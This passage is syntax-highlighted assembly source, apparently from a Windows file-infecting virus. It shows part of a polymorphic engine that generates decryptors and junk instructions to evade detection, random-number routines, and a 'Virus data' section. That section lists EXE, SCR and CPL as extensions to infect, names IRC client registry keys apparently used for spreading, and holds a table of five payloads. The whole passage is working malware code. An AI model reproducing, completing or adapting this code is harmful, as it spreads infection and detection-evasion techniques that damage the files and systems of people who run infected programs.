    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_PointerReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GIP_IncIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_PointerReg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">THME_GIP_II_Loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenGarbage</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">THME_GIP_II_Loop</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GenDecCounter</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GDC_@@2</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GDC_@@3</span><span class="sc0">
</span><span class="sc5">THME_GDC_@@1</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">; SUB E??,1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CounterReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11101000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GDC_EXIT</span><span class="sc0">
</span><span class="sc5">THME_GDC_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                          </span><span class="sc1">; DEC E??</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CounterReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GDC_EXIT</span><span class="sc0">
</span><span class="sc5">THME_GDC_@@3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">                          </span><span class="sc1">; ADD E??,-1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CounterReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">THME_GDC_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GenLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">                        </span><span class="sc1">; JNZ FAR ????????</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_LoopAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_OneByters</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">cmc</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lahf</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">salc</span><span class="sc0">
</span><span class="sc5">sTHME_OneByters</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">THME_OneByters</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">THME_Copro</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc7">f2xm1</span><span class="sc0">
    </span><span class="sc7">fabs</span><span class="sc0">
    </span><span class="sc7">fadd</span><span class="sc0">
    </span><span class="sc7">faddp</span><span class="sc0">
    </span><span class="sc7">fchs</span><span class="sc0">
    </span><span class="sc7">fnclex</span><span class="sc0">
    </span><span class="sc7">fcom</span><span class="sc0">
    </span><span class="sc7">fcomp</span><span class="sc0">
    </span><span class="sc7">fcompp</span><span class="sc0">
    </span><span class="sc7">fcos</span><span class="sc0">
    </span><span class="sc7">fdecstp</span><span class="sc0">
    </span><span class="sc7">fdiv</span><span class="sc0">
    </span><span class="sc7">fdivp</span><span class="sc0">
    </span><span class="sc7">fdivr</span><span class="sc0">
    </span><span class="sc7">fdivrp</span><span class="sc0">
    </span><span class="sc7">ffree</span><span class="sc0">
    </span><span class="sc7">fincstp</span><span class="sc0">
    </span><span class="sc7">fld1</span><span class="sc0">
    </span><span class="sc7">fldl2t</span><span class="sc0">
    </span><span class="sc7">fldl2e</span><span class="sc0">
    </span><span class="sc7">fldpi</span><span class="sc0">
    </span><span class="sc7">fldln2</span><span class="sc0">
    </span><span class="sc7">fldz</span><span class="sc0">
    </span><span class="sc7">fmul</span><span class="sc0">
    </span><span class="sc7">fmulp</span><span class="sc0">
    </span><span class="sc7">fnclex</span><span class="sc0">
    </span><span class="sc7">fnop</span><span class="sc0">
    </span><span class="sc7">fpatan</span><span class="sc0">
    </span><span class="sc7">fprem</span><span class="sc0">
    </span><span class="sc7">fprem1</span><span class="sc0">
    </span><span class="sc7">fptan</span><span class="sc0">
    </span><span class="sc7">frndint</span><span class="sc0">
    </span><span class="sc7">fscale</span><span class="sc0">
    </span><span class="sc7">fsin</span><span class="sc0">
    </span><span class="sc7">fsincos</span><span class="sc0">
    </span><span class="sc7">fsqrt</span><span class="sc0">
    </span><span class="sc7">fst</span><span class="sc0">
    </span><span class="sc7">fstp</span><span class="sc0">
    </span><span class="sc7">fsub</span><span class="sc0">
    </span><span class="sc7">fsubp</span><span class="sc0">
    </span><span class="sc7">fsubr</span><span class="sc0">
    </span><span class="sc7">fsubrp</span><span class="sc0">
    </span><span class="sc7">ftst</span><span class="sc0">
    </span><span class="sc7">fucom</span><span class="sc0">
    </span><span class="sc7">fucomp</span><span class="sc0">
    </span><span class="sc7">fucompp</span><span class="sc0">
    </span><span class="sc7">fxam</span><span class="sc0">
    </span><span class="sc7">fxtract</span><span class="sc0">
    </span><span class="sc7">fyl2x</span><span class="sc0">
    </span><span class="sc7">fyl2xp1</span><span class="sc0">
</span><span class="sc5">sTHME_Copro</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">THME_Copro</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; Possibilities before crypt operation</span><span class="sc0">

</span><span class="sc5">THME_Decrypt1</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_Decrypt1a</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_Decrypt1b</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_Decrypt1c</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sTHME_Decrypt1</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">THME_Decrypt1</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">THME_Decrypt1a</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenDeltaOffset</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenLoadSize</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenLoadPointer</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sTHME_Decrypt1a</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">THME_Decrypt1a</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">THME_Decrypt1b</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenDeltaOffset</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenLoadPointer</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenLoadSize</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sTHME_Decrypt1b</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">THME_Decrypt1b</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">THME_Decrypt1c</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenLoadSize</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenDeltaOffset</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GenLoadPointer</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sTHME_Decrypt1c</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">THME_Decrypt1c</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; Main table (for garbage generation)</span><span class="sc0">

</span><span class="sc5">THME_GBG_Table</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_Arithmetic_EAX_IMM32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_Arithmetic_REG32_REG32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_Arithmetic_REG32_IMM32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_MOV_REG16_REG16</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_MOV_REG16_IMM16</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_MOV_REG32_REG32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_MOV_REG32_IMM32</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_GenOneByter</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_GenCopro</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_GenPUSHPOP</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">THME_GBG_GenCALL_Type1</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sTHME_GBG_Table</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">THME_GBG_Table</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">thme_end</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">THME</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Random procedures </span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; RANDOM</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Random number</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">                            </span><span class="sc1">; Thanx MDriller! ;)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed1</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed3</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed3</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed3</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd_seed2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; R_RANGE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Number of possible random numbers</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Number between 0 and (EAX-1)</span><span class="sc0">

</span><span class="sc5">r_range</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">r_range</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Virus data</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; I went to god just to see, and i was looking at me.</span><span class="sc0">

</span><span class="sc5">_MASK</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*."</span><span class="sc0">
</span><span class="sc5">EXTENSION</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">EXTENSIONS</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; Nice table: very easy to </span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SCR"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; add new extensions to infect</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CPL"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_EXT</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXTENSIONS</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ALL_MASK</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">dotdot</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">root</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">"c:\",0                 ; Don't be afraid... :)
</span><span class="sc0">
</span><span class="sc5">key_mIRC</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"iKX\Thorin\mIRC32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">key_PIRCH</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"iKX\Thorin\Pirch32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">key_ViRC97</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"iKX\Thorin\ViRC97"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Whoaaaaa... many many many payloads! </span><span class="sc0">

</span><span class="sc5">payload_table</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">payload1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">payload2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">payload3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">payload4</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">payload5</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">payload_number</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">payload_table</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">infections</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
